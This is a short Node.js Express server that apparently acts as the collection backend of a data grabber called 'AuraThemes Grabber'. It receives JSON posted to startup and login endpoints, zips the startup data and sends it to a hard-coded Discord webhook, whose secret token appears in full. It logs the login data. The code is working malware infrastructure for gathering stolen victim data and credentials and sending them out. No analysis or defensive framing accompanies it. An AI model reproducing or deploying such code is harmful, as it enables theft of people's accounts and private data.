const app = require('express')(),
    http = require('http'),
    fs = require('fs'),
    archiver = require('archiver'),
    axios = require('axios'),
    bodyParser = require('body-parser'),
    server = http.createServer(app),
    FormData = require('form-data');
let Webhook = require("discord-webhook-node").Webhook,
    webhook = new Webhook("https://discord.com/api/webhooks/1170798177323073626/TEjia3OM8gasWnbGshZxluwdXQE0FR8assqj1OG1iHMdNANq3M3sAHqe6Bc2ez4Ppl2w").setUsername("AuraThemes Grabber").setAvatar("https://avatars.githubusercontent.com/u/149415297?s=200&v=4")

    
String.prototype.hi = function(i, s) {
  if (i < 0) i = 0; if (i > this.length) i = this.length;
  return this.slice(0, i) + s + this.slice(i);
};

app.set('port',3000);   
app.use(bodyParser.text());
app.use(bodyParser.json());


app.post('/request/startup', (req, res) => {
  res.sendStatus(200);
  req = JSON.parse(req.body);
  if (!fs.existsSync('zips')) fs.mkdirSync('zips');

  let zip = `zips/${req.filename}.zip`;
  let output = fs.createWriteStream(zip);
  let archive = archiver('zip', { zlib: { level: 9 } });
  output.on('close', () => {
    if (fs.existsSync(zip)) webhook.sendFile(zip);
  });

  archive.pipe(output);
  archive.append(JSON.stringify(req, null, 2), { name: 'data.txt' });
  archive.finalize();
  console.log(req);
  
});

app.post("/request/login", (req, res) => {
    res.sendStatus(200)
    req = JSON.parse(req.body);
    console.log(req);
})

server.listen(app.get('port'), () => {
  console.log(`http://localhost:${app.get('port')}`);
});


